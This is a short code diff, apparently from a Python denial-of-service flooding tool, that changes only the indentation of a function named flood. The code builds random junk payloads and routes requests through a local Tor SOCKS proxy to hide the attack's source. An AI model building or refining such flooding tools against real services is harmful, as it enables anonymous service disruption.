@@ -25,11 +25,11 @@ def flood(target,domainname,attack,sock):
     s = requests.Session()
     payload = str(random._urandom(random.randint(10, 500)))
     if sock =='http':
-		proxies = {'http': "socks5://127.0.0.1:9050"}
+        proxies = {'http': "socks5://127.0.0.1:9050"}
     elif sock =='https':
-		proxies = {'https': "socks5h://127.0.0.1:9050"}
+        proxies = {'https': "socks5h://127.0.0.1:9050"}
     else:
-		proxies =''
+        proxies =''
 		
     try:
 		if proxies!='':
